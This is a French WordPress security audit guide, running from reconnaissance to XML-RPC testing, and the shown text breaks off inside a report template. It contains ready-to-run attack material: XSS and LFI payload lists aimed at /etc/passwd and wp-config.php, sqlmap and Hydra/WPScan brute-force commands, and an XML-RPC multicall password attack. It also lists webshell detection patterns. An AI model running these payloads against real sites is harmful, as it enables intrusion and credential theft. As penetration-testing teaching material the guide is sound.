# 🔍 Guide d'Analyse des Failles de Sécurité WordPress

> **Objectif :** Méthodologie complète pour auditer la sécurité d'un site WordPress —  
> de la reconnaissance à la remédiation, avec outils et commandes prêts à l'emploi.
>
> ⚠️ **Avertissement légal :** Ce guide est destiné à l'audit de vos propres sites ou dans le cadre  
> d'une mission avec autorisation écrite explicite du propriétaire. Tout test non autorisé est illégal.

---

## Table des matières

1. [Méthodologie générale](#1-méthodologie-générale)
2. [Phase 1 — Reconnaissance passive](#2-phase-1--reconnaissance-passive)
3. [Phase 2 — Reconnaissance active](#3-phase-2--reconnaissance-active)
4. [Phase 3 — Scan avec WPScan](#4-phase-3--scan-avec-wpscan)
5. [Phase 4 — Analyse des plugins & thèmes](#5-phase-4--analyse-des-plugins--thèmes)
6. [Phase 5 — Analyse de l'authentification](#6-phase-5--analyse-de-lauthentification)
7. [Phase 6 — Analyse des fichiers & permissions](#7-phase-6--analyse-des-fichiers--permissions)
8. [Phase 7 — Analyse de la base de données](#8-phase-7--analyse-de-la-base-de-données)
9. [Phase 8 — Analyse des headers HTTP](#9-phase-8--analyse-des-headers-http)
10. [Phase 9 — Failles applicatives (XSS, SQLi, LFI)](#10-phase-9--failles-applicatives-xss-sqli-lfi)
11. [Phase 10 — Test des API REST & XML-RPC](#11-phase-10--test-des-api-rest--xml-rpc)
12. [Rapport d'audit — Modèle](#12-rapport-daudit--modèle)
13. [Plan de remédiation](#13-plan-de-remédiation)
14. [Outils de référence](#14-outils-de-référence)

---

## 1. Méthodologie générale

### Les 5 étapes d'un audit WordPress

```
┌─────────────────────────────────────────────────────────┐
│  1. RECONNAISSANCE    →  Collecter les informations      │
│  2. ÉNUMÉRATION       →  Identifier la surface d'attaque │
│  3. SCAN              →  Détecter les vulnérabilités     │
│  4. EXPLOITATION      →  Vérifier (PoC non destructif)   │
│  5. REMÉDIATION       →  Corriger & durcir               │
└─────────────────────────────────────────────────────────┘
```

### Cadre légal — Avant de commencer

- [ ] Obtenir une **autorisation écrite** du propriétaire du site
- [ ] Définir le **périmètre** exact (URLs, IP, environnements)
- [ ] Préciser les **actions autorisées** (lecture seule, exploitation contrôlée, etc.)
- [ ] Travailler sur une **copie de staging** si possible
- [ ] Documenter **toutes les actions** avec horodatage

### Outils nécessaires

```bash
# Installation des outils principaux
# Sur Kali Linux / Parrot OS (recommandé)

# WPScan — scanner WordPress dédié
gem install wpscan
# ou
docker pull wpscanteam/wpscan

# Autres outils
sudo apt install -y \
  nmap \
  nikto \
  curl \
  wget \
  jq \
  gobuster \
  sqlmap \
  whatweb

# Obtenir un token API WPScan (gratuit — 25 scans/jour)
# https://wpscan.com/register
export WPSCAN_TOKEN="votre_token_ici"
```

---

## 2. Phase 1 — Reconnaissance passive

> **Règle d'or :** Ne générer aucun trafic vers la cible dans cette phase.

### 2.1 Collecte d'informations OSINT

```bash
# Informations WHOIS
whois example.com

# Historique DNS
dig example.com ANY
dig example.com MX
dig example.com TXT
nslookup -type=any example.com

# Découvrir l'IP réelle derrière Cloudflare
# (chercher d'anciennes entrées DNS)
curl "https://api.hackertarget.com/hostsearch/?q=example.com"

# Sous-domaines via crt.sh (Certificate Transparency)
curl -s "https://crt.sh/?q=%.example.com&output=json" | \
  jq -r '.[].name_value' | sort -u

# Sous-domaines via SecurityTrails (nécessite compte gratuit)
# https://securitytrails.com/domain/example.com

# Technologies utilisées (sans contacter le site)
# https://builtwith.com/example.com
# https://www.wappalyzer.com/lookup/example.com
```

### 2.2 Recherche de fuites d'informations

```bash
# Google Dorks pour trouver des pages sensibles exposées
# (rechercher dans Google, pas de contact direct avec le site)

# Pages de login exposées
site:example.com inurl:wp-login.php
site:example.com inurl:wp-admin

# Fichiers sensibles indexés
site:example.com filetype:log
site:example.com filetype:sql
site:example.com filetype:bak
site:example.com filetype:old
site:example.com filetype:php inurl:debug

# Informations de configuration exposées
site:example.com inurl:wp-config
site:example.com "index of" wp-content

# Erreurs PHP exposées
site:example.com "Warning: " filetype:php
site:example.com "Fatal error" filetype:php

# Anciens fichiers en cache (Wayback Machine)
# https://web.archive.org/web/*/example.com/*
curl "https://web.archive.org/cdx/search/cdx?url=example.com/*&output=json&fl=original&collapse=urlkey" | \
  jq -r '.[] | .[0]' | grep -E '\.(php|bak|sql|log|old|zip|tar)$'
```

### 2.3 Recherche de credentials compromis

```bash
# Vérifier si des emails du domaine ont été compromis
# https://haveibeenpwned.com/DomainSearch (payant)

# Rechercher dans des leaks publics
# https://dehashed.com (payant)
# https://intelx.io

# Chercher des configs/passwords sur GitHub
# github.com/search?q=example.com+password&type=code
# github.com/search?q=example.com+wp-config&type=code
# github.com/search?q=example.com+DB_PASSWORD&type=code
```

---

## 3. Phase 2 — Reconnaissance active

> À partir d'ici, des requêtes sont envoyées vers la cible. Documenter chaque action.

### 3.1 Vérifier que WordPress est bien utilisé

```bash
TARGET="https://example.com"

# Détection par WhatWeb
whatweb $TARGET

# Détection manuelle — indicateurs WordPress
curl -s $TARGET | grep -i "wp-content\|wp-includes\|wordpress"

# Vérifier le fichier readme (souvent expose la version)
curl -s $TARGET/readme.html | grep -i "version"
curl -s $TARGET/license.txt

# Vérifier wp-login.php
curl -I $TARGET/wp-login.php

# Vérifier le flux RSS (contient souvent la version WP)
curl -s $TARGET/feed/ | grep -i "generator"
# ou
curl -s "$TARGET/?feed=rss2" | grep "generator"
```

### 3.2 Identifier la version de WordPress

```bash
TARGET="https://example.com"

# Méthode 1 — Balise meta generator (souvent cachée)
curl -s $TARGET | grep -i "generator"

# Méthode 2 — Fichier readme.html
curl -s $TARGET/readme.html

# Méthode 3 — Flux RSS
curl -s "$TARGET/?feed=rss2" | grep "generator"

# Méthode 4 — Fichier de style du thème par défaut
curl -s $TARGET/wp-includes/css/buttons.min.css | head -5

# Méthode 5 — Fichier version.php (rarement accessible)
curl -s $TARGET/wp-includes/version.php

# Méthode 6 — Hash de fichiers JS connus (fingerprinting)
# Comparer le hash de fichiers statiques avec ceux connus de chaque version
curl -s $TARGET/wp-includes/js/wp-emoji-release.min.js | md5sum
# Comparer avec : https://github.com/nicowillis/wordpress-version-fingerprinting
```

### 3.3 Cartographier la surface d'attaque

```bash
TARGET="https://example.com"

# Découverte de répertoires et fichiers sensibles
gobuster dir \
  -u $TARGET \
  -w /usr/share/wordlists/dirb/common.txt \
  -x php,html,txt,bak,old,zip \
  -t 20 \
  --timeout 10s \
  -o gobuster-results.txt

# Fichiers WordPress typiquement exposés
for file in \
  "wp-config.php" \
  "wp-config.php.bak" \
  "wp-config-sample.php" \
  ".htaccess" \
  "error_log" \
  "debug.log" \
  "wp-content/debug.log" \
  "wp-admin/install.php" \
  "wp-cron.php" \
  "xmlrpc.php" \
  "wp-json/wp/v2/users" \
  "wp-content/uploads/" \
  "wp-content/backup-db/" \
  "wp-content/backups/" \
  ".git/config" \
  ".git/HEAD" \
  "Dockerfile" \
  ".env"
do
  STATUS=$(curl -s -o /dev/null -w "%{http_code}" $TARGET/$file)
  echo "[$STATUS] $TARGET/$file"
done
```

---

## 4. Phase 3 — Scan avec WPScan

### 4.1 Scan de base

```bash
TARGET="https://example.com"
TOKEN="votre_token_wpscan"

# Scan complet avec détection de vulnérabilités
wpscan \
  --url $TARGET \
  --api-token $TOKEN \
  --enumerate vp,vt,u,m,cb,dbe \
  --detection-mode aggressive \
  --plugins-detection aggressive \
  --themes-detection aggressive \
  --output wpscan-report.json \
  --format json

# Options d'énumération expliquées :
# vp  = plugins vulnérables
# vt  = thèmes vulnérables
# u   = utilisateurs (1-100 par défaut)
# m   = fichiers médias exposés
# cb  = config backups (wp-config.php.bak, etc.)
# dbe = exports de base de données exposés

# Scan avec authentification (si accès admin disponible)
wpscan \
  --url $TARGET \
  --api-token $TOKEN \
  --username admin \
  --password motdepasse \
  --enumerate ap,at,u \
  --detection-mode aggressive
```

### 4.2 Scan ciblé par composant

```bash
TARGET="https://example.com"

# Énumérer uniquement les utilisateurs
wpscan --url $TARGET --enumerate u --users-list /usr/share/wordlists/names.txt

# Énumérer tous les plugins (pas seulement les vulnérables)
wpscan --url $TARGET --enumerate ap --detection-mode aggressive

# Tester un plugin spécifique
wpscan --url $TARGET --enumerate p --plugins-list mon-plugin

# Tester les backups de config
wpscan --url $TARGET --enumerate cb

# Scan via proxy (Burp Suite pour intercepter le trafic)
wpscan --url $TARGET --proxy http://127.0.0.1:8080

# Avec un User-Agent personnalisé
wpscan --url $TARGET --user-agent "Mozilla/5.0 (compatible; Googlebot/2.1)"

# Limiter le débit pour ne pas déclencher les WAF
wpscan --url $TARGET --throttle 1000  # 1 requête/seconde max
```

### 4.3 Interpréter les résultats WPScan

```
[!] = Vulnérabilité confirmée avec CVE
[+] = Information trouvée
[i] = Information informative
[?] = Non déterminé

Éléments critiques à noter dans le rapport :
- Version WordPress (outdated ?)
- Plugins avec CVE référencés
- Thèmes avec vulnérabilités connues
- Utilisateurs énumérés
- Fichiers sensibles exposés
- Config backups détectés
```

---

## 5. Phase 4 — Analyse des plugins & thèmes

### 5.1 Énumération manuelle des plugins

```bash
TARGET="https://example.com"

# Méthode 1 — Parser le code source HTML
curl -s $TARGET | grep -oP "wp-content/plugins/[^/]+" | sort -u

# Méthode 2 — Tentatives sur des chemins connus
# Wordlist de plugins populaires
while IFS= read -r plugin; do
  STATUS=$(curl -s -o /dev/null -w "%{http_code}" "$TARGET/wp-content/plugins/$plugin/")
  if [ "$STATUS" = "200" ] || [ "$STATUS" = "403" ]; then
    echo "[$STATUS] Trouvé : $plugin"
  fi
done < /usr/share/wpscan/db/plugin_slugs.txt

# Méthode 3 — Vérifier les fichiers readme.txt des plugins (expose la version)
curl -s "$TARGET/wp-content/plugins/contact-form-7/readme.txt" | grep -i "stable tag\|version"
curl -s "$TARGET/wp-content/plugins/woocommerce/readme.txt" | grep -i "stable tag"
```

### 5.2 Vérifier les vulnérabilités connues des plugins

```bash
# WPVulnDB — base de données de vulnérabilités WordPress
# https://wpscan.com/plugins/nom-du-plugin

# Via l'API WPScan (nécessite token)
curl -s -H "Authorization: Token token=$WPSCAN_TOKEN" \
  "https://wpscan.com/api/v3/plugins/contact-form-7" | jq .

# Chercher dans la NVD (National Vulnerability Database)
curl -s "https://services.nvd.nist.gov/rest/json/cves/2.0?keywordSearch=wordpress+contact-form-7" | \
  jq '.vulnerabilities[].cve | {id: .id, description: .descriptions[0].value, score: .metrics.cvssMetricV31[0].cvssData.baseScore}'

# Vérifier Patchstack (gratuit pour la recherche)
# https://patchstack.com/database/?s=nom-du-plugin

# Vérifier WPScan Vulnerability DB directement
curl -s "https://www.wpvulndb.com/api/v3/plugins/elementor" | jq '.elementor.vulnerabilities'
```

### 5.3 Analyse statique des plugins personnalisés

```bash
# Si vous avez accès aux fichiers source du plugin
PLUGIN_DIR="/var/www/html/wp-content/plugins/mon-plugin"

# Rechercher des fonctions dangereuses
grep -rn \
  "eval\|base64_decode\|system\|exec\|passthru\|shell_exec\|popen\|proc_open" \
  $PLUGIN_DIR

# Rechercher des requêtes SQL non paramétrées
grep -rn "wpdb->query\|wpdb->get_results\|wpdb->get_row" $PLUGIN_DIR | \
  grep -v "prepare\|%s\|%d"  # Lignes sans prepare() sont suspectes

# Rechercher des nonces manquants (CSRF)
grep -rn "wp_ajax_\|admin-ajax.php" $PLUGIN_DIR
# Vérifier si chaque handler vérifie check_ajax_referer() ou wp_verify_nonce()

# Rechercher des capability checks manquants
grep -rn "add_action.*wp_ajax\|add_action.*admin_post" $PLUGIN_DIR
# Vérifier si current_user_can() est présent dans chaque handler

# Rechercher des includes/requires avec des variables
grep -rn "include\|require" $PLUGIN_DIR | grep '\$'

# Fichiers avec permissions d'exécution (suspect)
find $PLUGIN_DIR -name "*.php" -perm /111

# Fichiers modifiés récemment (indicateur de compromission)
find $PLUGIN_DIR -name "*.php" -newer /var/www/html/wp-login.php -ls
```

---

## 6. Phase 5 — Analyse de l'authentification

### 6.1 Énumération des utilisateurs

```bash
TARGET="https://example.com"

# Méthode 1 — API REST (souvent activée par défaut)
curl -s "$TARGET/wp-json/wp/v2/users" | jq '.[] | {id: .id, name: .name, slug: .slug}'

# Méthode 2 — Paramètre ?author=N
for i in {1..10}; do
  RESPONSE=$(curl -s -o /dev/null -w "%{redirect_url}" -L "$TARGET/?author=$i")
  if [ -n "$RESPONSE" ]; then
    echo "Utilisateur $i : $RESPONSE"
  fi
done

# Méthode 3 — Flux RSS de l'auteur
curl -s "$TARGET/?author=1&feed=rss2" | grep -i "<author>"

# Méthode 4 — WPScan
wpscan --url $TARGET --enumerate u --users-list /usr/share/wordlists/usernames.txt

# Méthode 5 — Sitemap
curl -s "$TARGET/sitemap.xml" | grep "author"
curl -s "$TARGET/author-sitemap.xml"
```

### 6.2 Test de la page de connexion

```bash
TARGET="https://example.com"

# Vérifier si la page de login révèle les usernames valides
# Message d'erreur différent si le login existe vs n'existe pas

# Test avec un utilisateur inexistant
curl -s -X POST "$TARGET/wp-login.php" \
  -d "log=utilisateur_inexistant_xyz&pwd=mauvais_mdp&wp-submit=Log+In&testcookie=1" \
  -H "Cookie: wordpress_test_cookie=WP+Cookie+check" | \
  grep -i "error\|incorrect\|invalid"

# Test avec un utilisateur connu (ex: admin)
curl -s -X POST "$TARGET/wp-login.php" \
  -d "log=admin&pwd=mauvais_mdp&wp-submit=Log+In&testcookie=1" \
  -H "Cookie: wordpress_test_cookie=WP+Cookie+check" | \
  grep -i "error\|incorrect\|invalid"

# Si les messages sont différents → enumeration possible

# Vérifier la présence d'un CAPTCHA ou de protection brute-force
curl -s "$TARGET/wp-login.php" | grep -i "captcha\|recaptcha\|hcaptcha\|nonce"

# Vérifier si wp-login.php est protégé par HTTP Auth
curl -I "$TARGET/wp-login.php"
# Si 401 → protégé. Si 200 → non protégé.
```

### 6.3 Test de la réinitialisation de mot de passe

```bash
TARGET="https://example.com"

# Vérifier si le formulaire révèle les emails/logins valides
curl -s -X POST "$TARGET/wp-login.php?action=lostpassword" \
  -d "user_login=admin&redirect_to=&wp-submit=Get+New+Password" | \
  grep -i "error\|success\|email\|sent"

# Vérifier la force du lien de réinitialisation
# (doit être à usage unique, expirant, imprévisible)

# Tester si le token de reset peut être bruteforcé
# (NON DESTRUCTIF — vérifier uniquement la longueur et le format du token)
curl -s "$TARGET/wp-login.php?action=lostpassword" \
  -d "user_login=admin" | grep -i "key\|token\|reset"
```

### 6.4 Test brute-force (environnement de test uniquement)

```bash
# ⚠️ UNIQUEMENT sur votre propre installation / avec autorisation explicite

TARGET="https://example.com"

# Brute force avec WPScan
wpscan \
  --url $TARGET \
  --usernames admin \
  --passwords /usr/share/wordlists/rockyou.txt \
  --password-attack wp-login \
  --throttle 2000  # 1 tentative / 2 secondes

# Brute force XML-RPC (plus difficile à bloquer)
wpscan \
  --url $TARGET \
  --usernames admin \
  --passwords /usr/share/wordlists/rockyou.txt \
  --password-attack xmlrpc-multicall  # Teste plusieurs passwords par requête XML-RPC

# Via Hydra
hydra -l admin -P /usr/share/wordlists/rockyou.txt \
  $TARGET http-post-form \
  "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:ERROR"
```

---

## 7. Phase 6 — Analyse des fichiers & permissions

### 7.1 Vérification des fichiers sensibles exposés

```bash
TARGET="https://example.com"

# Fichiers qui NE doivent PAS être accessibles publiquement
declare -A SENSITIVE_FILES=(
  ["wp-config.php"]="Configuration principale (BDD, clés secrètes)"
  ["wp-config.php.bak"]="Backup de config"
  [".htaccess"]="Règles Apache"
  ["error_log"]="Logs d'erreurs PHP"
  ["wp-content/debug.log"]="Log de debug WordPress"
  ["wp-content/upgrade/"]="Fichiers de mise à jour"
  ["wp-content/backup-db/"]="Backups de base de données"
  [".git/config"]="Configuration Git (peut exposer le code source)"
  [".git/HEAD"]="Repository Git exposé"
  [".env"]="Variables d'environnement"
  ["phpinfo.php"]="Informations PHP sensibles"
  ["info.php"]="Informations PHP sensibles"
  ["test.php"]="Fichier de test oublié"
  ["wp-admin/install.php"]="Script d'installation"
  ["wp-admin/setup-config.php"]="Script de configuration"
)

for file in "${!SENSITIVE_FILES[@]}"; do
  STATUS=$(curl -s -o /dev/null -w "%{http_code}" "$TARGET/$file")
  if [ "$STATUS" = "200" ]; then
    echo "🔴 EXPOSÉ [$STATUS] $file — ${SENSITIVE_FILES[$file]}"
  elif [ "$STATUS" = "403" ]; then
    echo "🟡 BLOQUÉ [$STATUS] $file — Accès refusé mais existe"
  else
    echo "🟢 OK    [$STATUS] $file"
  fi
done
```

### 7.2 Vérification des permissions (accès serveur requis)

```bash
# Si vous avez accès SSH au serveur

WP_ROOT="/var/www/html"

echo "=== Permissions des fichiers critiques ==="

# wp-config.php — doit être 400 ou 440 (jamais 644 ou 777)
ls -la $WP_ROOT/wp-config.php
# Recommandé : chmod 400 wp-config.php (lecture propriétaire uniquement)

# Répertoires — doivent être 755 max
find $WP_ROOT -type d -perm /022 -ls | head -20
# Dossiers avec write pour group/other → potentiellement dangereux

# Fichiers PHP — doivent être 644 max
find $WP_ROOT -name "*.php" -perm /022 -ls | head -20

# Fichiers avec permissions 777 (très dangereux)
find $WP_ROOT -perm 777 -ls

# Fichiers appartenant à root (peuvent indiquer une compromission)
find $WP_ROOT -user root -ls | head -20

# Fichiers modifiés dans les 24h (indicateur de compromission potentielle)
find $WP_ROOT -name "*.php" -mtime -1 -ls

# Fichiers PHP dans wp-content/uploads (ne devrait JAMAIS y en avoir)
find $WP_ROOT/wp-content/uploads -name "*.php" -ls
find $WP_ROOT/wp-content/uploads -name "*.phtml" -ls
find $WP_ROOT/wp-content/uploads -name "*.phar" -ls

echo "=== Vérification des fichiers suspects ==="

# Chercher des webshells (patterns courants)
grep -rn "eval(base64_decode\|system(\$_\|exec(\$_\|passthru(\$_\|shell_exec(\$_" \
  $WP_ROOT/wp-content/ 2>/dev/null

# Chercher des backdoors (injection via POST/GET)
grep -rn '\$_POST\|\$_GET\|\$_REQUEST\|\$_COOKIE' \
  $WP_ROOT/wp-content/uploads/ 2>/dev/null
```

### 7.3 Détection de compromission

```bash
WP_ROOT="/var/www/html"

echo "=== Recherche de fichiers malveillants ==="

# Patterns de webshells communs
PATTERNS=(
  "eval(base64_decode"
  "eval(gzinflate"
  "eval(str_rot13"
  "eval(gzuncompress"
  "\$_POST\[.*\].*eval"
  "preg_replace.*\/e.*\$_"
  "assert(\$_"
  "call_user_func.*\$_"
  "FilesMan"       # WSO webshell
  "b374k"          # b374k webshell
  "c99shell"       # c99 webshell
  "r57shell"       # r57 webshell
  "phpspy"
)

for pattern in "${PATTERNS[@]}"; do
  FOUND=$(grep -rln "$pattern" $WP_ROOT 2>/dev/null)
  if [ -n "$FOUND" ]; then
    echo "🔴 Pattern suspect trouvé : '$pattern'"
    echo "$FOUND"
  fi
done

# Vérifier l'intégrité des fichiers WordPress core
# Télécharger la version officielle et comparer
WP_VERSION=$(curl -s "$TARGET/readme.html" | grep -oP "Version \K[0-9.]+")
echo "Version WP détectée : $WP_VERSION"

# Télécharger les checksums officiels
curl -s "https://api.wordpress.org/core/checksums/1.0/?version=$WP_VERSION" | \
  jq -r '.checksums | to_entries[] | "\(.value) \(.key)"' > /tmp/wp-checksums.txt

# Comparer avec les fichiers locaux
cd $WP_ROOT
md5sum -c /tmp/wp-checksums.txt 2>/dev/null | grep FAILED
```

---

## 8. Phase 7 — Analyse de la base de données

### 8.1 Vérification de la configuration BDD

```bash
# Accès serveur requis

# Vérifier le préfixe des tables (wp_ par défaut = mauvaise pratique)
mysql -u root -p -e "SHOW TABLES;" wordpress | grep "^wp_"
# Si toutes les tables commencent par wp_ → le préfixe par défaut est utilisé
# Plus facile pour les injections SQL aveugles

# Vérifier les utilisateurs MySQL et leurs privilèges
mysql -u root -p -e "SELECT user, host, plugin FROM mysql.user;"
mysql -u root -p -e "SHOW GRANTS FOR 'wordpress_user'@'localhost';"
# L'utilisateur WP ne devrait avoir que : SELECT, INSERT, UPDATE, DELETE, CREATE, DROP, INDEX, ALTER

# Vérifier que la BDD n'est pas accessible depuis l'extérieur
netstat -tlnp | grep 3306
# Doit afficher 127.0.0.1:3306, pas 0.0.0.0:3306

# Chercher des comptes admin suspects dans la BDD
mysql -u root -p wordpress -e \
  "SELECT ID, user_login, user_email, user_registered FROM wp_users ORDER BY user_registered DESC LIMIT 10;"

# Chercher des options suspectes
mysql -u root -p wordpress -e \
  "SELECT option_name, option_value FROM wp_options WHERE option_name IN
  ('siteurl', 'home', 'admin_email', 'blogname', 'active_plugins');"

# Vérifier si des options malveillantes ont été injectées
mysql -u root -p wordpress -e \
  "SELECT option_name, option_value FROM wp_options
   WHERE option_value LIKE '%eval(%' OR option_value LIKE '%base64_decode%'
   OR option_value LIKE '%<script%';"

# Vérifier les usermeta pour des rôles non autorisés
mysql -u root -p wordpress -e \
  "SELECT u.user_login, m.meta_value FROM wp_users u
   JOIN wp_usermeta m ON u.ID = m.user_id
   WHERE m.meta_key = 'wp_capabilities'
   AND m.meta_value LIKE '%administrator%';"
```

### 8.2 Test d'injection SQL via l'interface web

```bash
TARGET="https://example.com"

# Test manuel sur les paramètres GET
# Ajouter ' à chaque paramètre et observer les erreurs
curl -s "$TARGET/?p=1'" | grep -i "error\|warning\|mysql\|sql"
curl -s "$TARGET/?cat=1'" | grep -i "error\|warning\|mysql\|sql"
curl -s "$TARGET/?author=1'" | grep -i "error\|warning\|mysql\|sql"

# Test avec SQLMap (UNIQUEMENT avec autorisation)
sqlmap \
  -u "$TARGET/?p=1" \
  --dbs \
  --random-agent \
  --level=3 \
  --risk=2 \
  --output-dir=/tmp/sqlmap-results \
  --dbms=mysql \
  --batch  # Pas d'interaction utilisateur

# Test sur les formulaires (recherche, contact)
sqlmap \
  -u "$TARGET/" \
  --data="s=test" \
  --forms \
  --dbs \
  --batch

# Test sur l'API REST
sqlmap \
  -u "$TARGET/wp-json/wp/v2/posts?search=test" \
  --dbs \
  --batch
```

---

## 9. Phase 8 — Analyse des headers HTTP

### 9.1 Analyse complète des headers de sécurité

```bash
TARGET="https://example.com"

echo "=== Analyse des headers de sécurité ==="

# Récupérer tous les headers
curl -sI $TARGET

# Vérifications individuelles
echo ""
echo "--- Headers de sécurité ---"

check_header() {
  local header=$1
  local value=$(curl -sI $TARGET | grep -i "^$header:" | head -1)
  if [ -n "$value" ]; then
    echo "✅ $value"
  else
    echo "❌ MANQUANT : $header"
  fi
}

check_header "Strict-Transport-Security"
check_header "Content-Security-Policy"
check_header "X-Frame-Options"
check_header "X-Content-Type-Options"
check_header "Referrer-Policy"
check_header "Permissions-Policy"
check_header "X-XSS-Protection"

echo ""
echo "--- Headers qui révèlent des informations ---"

# Ces headers ne devraient PAS être présents (révèlent la stack technique)
for header in "X-Powered-By" "Server" "X-Generator" "X-WordPress-Cache"; do
  VALUE=$(curl -sI $TARGET | grep -i "^$header:" | head -1)
  if [ -n "$VALUE" ]; then
    echo "⚠️  EXPOSÉ : $VALUE"
  fi
done

echo ""
echo "--- Vérification SSL/TLS ---"

# Analyse SSL complète avec sslyze
sslyze $TARGET:443 --certinfo --tlsv1 --tlsv1_1 --tlsv1_2 --tlsv1_3

# Ou avec testssl.sh
./testssl.sh $TARGET

# Version simplifiée avec openssl
openssl s_client -connect example.com:443 -servername example.com < /dev/null 2>/dev/null | \
  openssl x509 -noout -dates -subject -issuer
```

### 9.2 Test de sécurité SSL/TLS en ligne

```
# Outils en ligne pour tester le SSL/TLS (sans installation)

Qualys SSL Labs :  https://www.ssllabs.com/ssltest/analyze.html?d=example.com
Security Headers : https://securityheaders.com/?q=example.com
Mozilla Observatory: https://observatory.mozilla.org/analyze/example.com

Score cible :
- SSL Labs : A ou A+
- Security Headers : A ou A+
- Mozilla Observatory : B+ minimum
```

---

## 10. Phase 9 — Failles applicatives (XSS, SQLi, LFI)

### 10.1 Test XSS (Cross-Site Scripting)

```bash
TARGET="https://example.com"

# Payloads XSS de base à tester dans chaque champ de saisie
XSS_PAYLOADS=(
  '<script>alert(1)</script>'
  '"><script>alert(1)</script>'
  "'><script>alert(1)</script>"
  '<img src=x onerror=alert(1)>'
  '<svg onload=alert(1)>'
  'javascript:alert(1)'
  '"><img src=x onerror=alert(1)>'
  '<body onload=alert(1)>'
)

# Tester la barre de recherche
for payload in "${XSS_PAYLOADS[@]}"; do
  RESPONSE=$(curl -s "$TARGET/?s=$(python3 -c "import urllib.parse; print(urllib.parse.quote('$payload'))")")
  if echo "$RESPONSE" | grep -qF "$payload"; then
    echo "🔴 XSS RÉFLÉCHI trouvé dans la recherche avec : $payload"
  fi
done

# Tester les champs de commentaires (XSS stocké)
curl -s -X POST "$TARGET/wp-comments-post.php" \
  -d "comment=<script>alert(1)</script>&author=Test&email=test@test.com&url=&submit=Post+Comment&comment_post_ID=1&comment_parent=0"

# Vérifier si le commentaire est affiché avec le script intact
curl -s "$TARGET/?p=1" | grep -i "<script>alert"
```

### 10.2 Test LFI/RFI (File Inclusion)

```bash
TARGET="https://example.com"

# Payloads LFI à tester sur les paramètres de page/fichier
LFI_PAYLOADS=(
  "../../../../etc/passwd"
  "....//....//....//etc/passwd"
  "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"
  "php://filter/convert.base64-encode/resource=wp-config"
  "php://filter/read=convert.base64-encode/resource=../wp-config.php"
  "/proc/self/environ"
)

# Tester sur les paramètres suspects
for payload in "${LFI_PAYLOADS[@]}"; do
  RESPONSE=$(curl -s "$TARGET/?page=$payload")
  if echo "$RESPONSE" | grep -q "root:x:0:0\|mysql\|DB_PASSWORD"; then
    echo "🔴 LFI trouvé avec : $payload"
    echo "$RESPONSE" | head -20
  fi
done
```

### 10.3 Test d'accès non autorisé aux fichiers

```bash
TARGET="https://example.com"

# Tentative de traversée de chemin via les paramètres de médias
curl -s "$TARGET/wp-content/uploads/../../wp-config.php"
curl -s "$TARGET/?file=../../../../wp-config.php"
curl -s "$TARGET/?template=../../../../wp-config"
curl -s "$TARGET/?page=../../../../etc/passwd"

# Test d'accès direct aux fichiers PHP sensibles
for file in \
  "wp-includes/class-wp-user.php" \
  "wp-admin/admin-ajax.php" \
  "wp-cron.php"
do
  STATUS=$(curl -s -o /dev/null -w "%{http_code}" "$TARGET/$file")
  echo "[$STATUS] $file"
done
```

---

## 11. Phase 10 — Test des API REST & XML-RPC

### 11.1 Test de l'API REST WordPress

```bash
TARGET="https://example.com"

echo "=== Test de l'API REST WordPress ==="

# Vérifier si l'API est activée
curl -s "$TARGET/wp-json/" | jq '.name, .description, .namespaces'

# Énumérer les endpoints disponibles
curl -s "$TARGET/wp-json/" | jq '.routes | keys[]'

# Énumérer les utilisateurs (faille critique si exposé)
echo ""
echo "--- Énumération des utilisateurs ---"
curl -s "$TARGET/wp-json/wp/v2/users" | \
  jq '.[] | {id: .id, name: .name, slug: .slug, link: .link}'

# Vérifier si la limite de users peut être contournée
curl -s "$TARGET/wp-json/wp/v2/users?per_page=100" | jq 'length'
curl -s "$TARGET/wp-json/wp/v2/users?context=edit" | jq '.[0].email'  # Email exposé ?

# Vérifier les posts non publiés accessibles
curl -s "$TARGET/wp-json/wp/v2/posts?status=draft" | jq 'length'
curl -s "$TARGET/wp-json/wp/v2/posts?status=private" | jq 'length'

# Tester la création de contenu sans authentification
curl -s -X POST "$TARGET/wp-json/wp/v2/posts" \
  -H "Content-Type: application/json" \
  -d '{"title": "Test", "content": "Test", "status": "publish"}' | \
  jq '.code, .message'  # Doit retourner rest_cannot_create ou unauthorized

# Tester la modification de contenu sans authentification
curl -s -X PUT "$TARGET/wp-json/wp/v2/posts/1" \
  -H "Content-Type: application/json" \
  -d '{"title": "Hacked"}' | \
  jq '.code, .message'  # Doit retourner une erreur d'authentification
```

### 11.2 Test XML-RPC

```bash
TARGET="https://example.com"

echo "=== Test XML-RPC ==="

# Vérifier si XML-RPC est activé
STATUS=$(curl -s -o /dev/null -w "%{http_code}" "$TARGET/xmlrpc.php")
echo "Status xmlrpc.php : $STATUS"

# Lister les méthodes disponibles
curl -s -X POST "$TARGET/xmlrpc.php" \
  -H "Content-Type: text/xml" \
  -d '<?xml version="1.0"?>
<methodCall>
  <methodName>system.listMethods</methodName>
  <params></params>
</methodCall>' | grep "<string>" | sort

# Test de brute-force multicall (1 requête = plusieurs tentatives)
# ⚠️ UNIQUEMENT avec autorisation — peut être très rapide
curl -s -X POST "$TARGET/xmlrpc.php" \
  -H "Content-Type: text/xml" \
  -d '<?xml version="1.0"?>
<methodCall>
  <methodName>system.multicall</methodName>
  <params>
    <param><value><array><data>
      <value><struct>
        <member><name>methodName</name><value><string>wp.getUsersBlogs</string></value></member>
        <member><name>params</name><value><array><data>
          <value><string>admin</string></value>
          <value><string>password1</string></value>
        </data></array></value></member>
      </struct></value>
      <value><struct>
        <member><name>methodName</name><value><string>wp.getUsersBlogs</string></value></member>
        <member><name>params</name><value><array><data>
          <value><string>admin</string></value>
          <value><string>password2</string></value>
        </data></array></value></member>
      </struct></value>
    </data></array></value></param>
  </params>
</methodCall>' | grep -i "fault\|success\|blogs"

# Vérifier si SSRF est possible via xmlrpc.system.getCapabilities
# (certaines versions permettent des requêtes vers des IP internes)
curl -s -X POST "$TARGET/xmlrpc.php" \
  -H "Content-Type: text/xml" \
  -d '<?xml version="1.0"?>
<methodCall>
  <methodName>system.getCapabilities</methodName>
  <params></params>
</methodCall>'
```

---

## 12. Rapport d'audit — Modèle

### Modèle de rapport d'audit de sécurité

```markdown
# Rapport d'Audit de Sécurité WordPress
**Site audité :** example.com  
**Date :** 2024-01-15  
**Auditeur :** Votre Nom  
**Cadre légal :** Autorisation écrite du 2024-01-10 (référence: REF-2024-001)

---

## Résumé Exécutif

| Criticité | Nombre de vulnérabilités |
|-----------|--------------------------|
| 🔴 Critique  | 2 |
